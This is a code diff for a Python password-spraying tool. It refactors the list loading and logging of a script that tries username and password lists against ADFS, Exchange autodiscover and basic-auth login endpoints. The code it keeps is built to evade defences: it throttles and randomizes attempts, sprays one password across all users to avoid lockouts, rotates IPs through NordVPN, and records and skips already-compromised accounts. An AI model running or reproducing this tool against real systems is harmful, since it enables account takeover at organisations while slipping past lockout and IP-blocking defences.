@@ -9,9 +9,8 @@ import time
 import urllib
 import urllib.parse
 import requests
-from random import randint
 from nordvpn_switcher import initialize_VPN,terminate_VPN
-from utils import configure_logger, safe_rotate_vpn, get_public_ip, excptn, init_db, log_event, has_user_password_been_tested, has_user_been_pwned
+from utils import configure_logger, random_time, userlist, passwordlist, targetlist, safe_rotate_vpn, get_public_ip, excptn, init_db, log_event, has_user_password_been_tested, has_user_been_pwned
 from requests.packages.urllib3.exceptions import InsecureRequestWarning, TimeoutError
 from requests_ntlm import HttpNtlmAuth
 
@@ -43,19 +42,10 @@ def args_parse():
     pass_group.add_argument('-P', '--passwordlist', help="Password list to test, one password per line")
     target_group.add_argument('-T', '--targetlist', help="Targets list to use, one target per line")
     target_group.add_argument('-t', '--target', help="Target server to authenticate against")
-    sleep_group.add_argument('-s', '--sleep', type=int,
-                             help="Throttle the attempts to one attempt every # seconds, "
-                                  "can be randomized by passing the value 'random' - default is 0",
-                             default=0)
-    sleep_group.add_argument('-r', '--random', nargs=2, type=int, metavar=(
-        'minimum_sleep', 'maximum_sleep'), help="Randomize the time between each authentication "
-                                                "attempt. Please provide minimum and maximum "
-                                                "values in seconds")
+    sleep_group.add_argument('-s', '--sleep', type=int, help="Throttle the attempts to one attempt every # seconds, can be randomized by passing the value 'random' - default is 0", default=0)
+    sleep_group.add_argument('-r', '--random', nargs=2, type=int, metavar=('minimum_sleep', 'maximum_sleep'), help="Randomize the time between each authentication attempt. Please provide minimum and maximum values in seconds")
     parser.add_argument('method', choices=['adfs', 'autodiscover', 'basicauth'])
-
-    parser.add_argument('-v', '--verbose', help="Turn on verbosity to show failed "
-                                                "attempts", action="store_true", default=False)
-    
+    parser.add_argument('-v', '--verbose', help="Turn on verbosity to show failed attempts", action="store_true", default=False)    
     parser.add_argument("--vpn", action=argparse.BooleanOptionalAction, help="Use nord vpn to rotate IP")
     parser.add_argument('--skip-tested', action='store_true', help="Skip user:password already tried and logged in the DB")
     parser.add_argument('--ignore-success', action='store_true', help="Skip user already pwned in the DB")
@@ -64,37 +54,14 @@ def args_parse():
 
 
 
-def userlist(incoming_userlist):  # Creating an array out of the users file
-    with open(incoming_userlist) as f:
-        usernames = f.readlines()
-    generated_usernames_stripped = [incoming_userlist.strip() for incoming_userlist in usernames]
-    return generated_usernames_stripped
-
-
-def passwordlist(incoming_passwordlist):  # Creating an array out of the passwords file
-    with open(incoming_passwordlist) as pass_obj:
-        return [p.strip() for p in pass_obj.readlines()]
-
-
-def targetlist(incoming_targetlist):  # Creating an array out of the targets file
-    with open(incoming_targetlist) as target_obj:
-        return [p.strip() for p in target_obj.readlines()]
-
-
-
-def random_time(minimum, maximum):
-    sleep_amount = randint(minimum, maximum)
-    return sleep_amount
-
-
-def basicauth_attempts(users, passes, targets, sleep_time, random, min_sleep, max_sleep, verbose):
+def basicauth_attempts(users, passwords, targets, sleep_time, random, min_sleep, max_sleep, verbose):
     working_creds_counter = 0  # zeroing the counter of working creds before starting to count
     
     ip = get_public_ip(timeout=5, retries=2)
     try:
         LOGGER.info("[*] Started running at: %s" % datetime.datetime.now().strftime('%d-%m-%Y %H:%M:%S'))
         for target in targets:  # checking each target separately
-            for password in passes:  # trying one password against each user, less likely to lockout users
+            for password in passwords:  # trying one password against each user, less likely to lockout users
                 for username in users:
                     session = requests.Session()
                     session.auth = (username, password)
@@ -128,14 +95,14 @@ def basicauth_attempts(users, passes, targets, sleep_time, random, min_sleep, ma
         excptn(e)
 
 
-def autodiscover_attempts(users, passes, targets, sleep_time, random, min_sleep, max_sleep, verbose):
+def autodiscover_attempts(users, passwords, targets, sleep_time, random, min_sleep, max_sleep, verbose):
     working_creds_counter = 0  # zeroing the counter of working creds before starting to count
 
     ip = get_public_ip(timeout=5, retries=2)
     try:
         LOGGER.info("[*] Started running at: %s" % datetime.datetime.now().strftime('%d-%m-%Y %H:%M:%S'))
         for target in targets:  # checking each target separately
-            for password in passes:  # trying one password against each user, less likely to lockout users
+            for password in passwords:  # trying one password against each user, less likely to lockout users
                 for username in users:
                     requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
                     req = requests.get(target, auth=HttpNtlmAuth(username, password),
@@ -169,16 +136,17 @@ def autodiscover_attempts(users, passes, targets, sleep_time, random, min_sleep,
         excptn(e)
 
 
-def adfs_attempts(users, passes, targets, sleep_time, random, min_sleep, max_sleep, vpn, area, initial_ip, skip_tested, ignore_success):
+def adfs_attempts(usernames, passwords, targets, sleep_time, random, min_sleep, max_sleep, vpn, area, initial_ip, skip_tested, ignore_success):
     working_creds_counter = 0  # zeroing the counter of working creds before starting to count
     username_counter = 0
     prev_ip = initial_ip
+    total_attempts = len(usernames) * len(passwords) * len(targets)
 
     try:
         LOGGER.info("[*] Started running at: %s" % datetime.datetime.now().strftime('%d-%m-%Y %H:%M:%S'))
         for target in targets:  # checking each target separately
-            for password in passes:  # trying one password against each user, less likely to lockout users
-                for username in users:
+            for password in passwords:  # trying one password against each user, less likely to lockout users
+                for username in usernames:
                     if ignore_success:
                         try:
                             already = has_user_been_pwned(username)
@@ -238,6 +206,7 @@ def adfs_attempts(users, passes, targets, sleep_time, random, min_sleep, max_sle
                     else:
                         time.sleep(float(sleep_time))
                     username_counter += 1
+                    LOGGER.info(f"{username_counter} of {total_attempts} users tested")
 
         LOGGER.info("[*] Overall compromised accounts: %s" % working_creds_counter)
         LOGGER.info("[*] Finished running at: %s" % datetime.datetime.now().strftime('%d-%m-%Y %H:%M:%S'))
@@ -255,43 +224,42 @@ def adfs_attempts(users, passes, targets, sleep_time, random, min_sleep, max_sle
 
 
 def main():
-    logo()
     args = args_parse()
     random = False
     min_sleep, max_sleep = 0, 0
-    usernames_stripped, passwords_stripped, targets_stripped = [], [], []
+    usernames, passwords, targets = [], [], []
     global LOGGER
     LOGGER = configure_logger(args.verbose, "ADFS")
     init_db("events.db")
 
     if args.userlist:
         try:
-            usernames_stripped = userlist(args.userlist)
+            usernames = userlist(args.userlist)
         except Exception as err:
             excptn(err)
     elif args.user:
         try:
-            usernames_stripped = [args.user]
+            usernames = [args.user]
         except Exception as err:
             excptn(err)
     if args.password:
         try:
-            passwords_stripped = [args.password]
+            passwords = [args.password]
         except Exception as err:
             excptn(err)
     elif args.passwordlist:
         try:
-            passwords_stripped = passwordlist(args.passwordlist)
+            passwords = passwordlist(args.passwordlist)
         except Exception as err:
             excptn(err)
     if args.target:
         try:
-            targets_stripped = [args.target]
+            targets = [args.target]
         except Exception as err:
             excptn(err)
     elif args.targetlist:
         try:
-            targets_stripped = targetlist(args.targetlist)
+            targets = targetlist(args.targetlist)
         except Exception as err:
             excptn(err)
     if args.random:
@@ -299,14 +267,16 @@ def main():
         min_sleep = args.random[0]
         max_sleep = args.random[1]
 
-    total_accounts = len(usernames_stripped)
-    total_passwords = len(passwords_stripped)
-    total_targets = len(targets_stripped)
+    total_accounts = len(usernames)
+    total_passwords = len(passwords)
+    total_targets = len(targets)
     total_attempts = total_accounts * total_passwords * total_targets
     LOGGER.info("Total number of users to test: %s" % str(total_accounts))
     LOGGER.info("Total number of passwords to test: %s" % str(total_passwords))
     LOGGER.info("Total number of targets to test: %s" % str(total_passwords))
     LOGGER.info("Total number of attempts: %s" % str(total_attempts))
+    LOGGER.info("Now spraying ADFS.")
+    LOGGER.info(f"Current date and time: {time.ctime()}")
 
     initial_ip = get_public_ip(timeout=5, retries=2)
     area = args.vpn_area or "Europe"
@@ -333,17 +303,17 @@ def main():
 
     if args.method == 'autodiscover':
         LOGGER.info("[*] You chose %s method" % args.method)
-        autodiscover_attempts(usernames_stripped, passwords_stripped, targets_stripped,
+        autodiscover_attempts(usernames, passwords, targets,
                               args.sleep, random, min_sleep, max_sleep, args.verbose)
 
     elif args.method == 'adfs':
         LOGGER.info("[*] You chose %s method" % args.method)
-        adfs_attempts(usernames_stripped, passwords_stripped, targets_stripped,
+        adfs_attempts(usernames, passwords, targets,
                       args.sleep, random, min_sleep, max_sleep, args.vpn, area, initial_ip, args.skip_tested, args.ignore_success)
 
     elif args.method == 'basicauth':
         LOGGER.info("[*] You chose %s method" % args.method)
-        basicauth_attempts(usernames_stripped, passwords_stripped, targets_stripped,
+        basicauth_attempts(usernames, passwords, targets,
                            args.sleep, random, min_sleep, max_sleep, args.verbose)
 
     else:
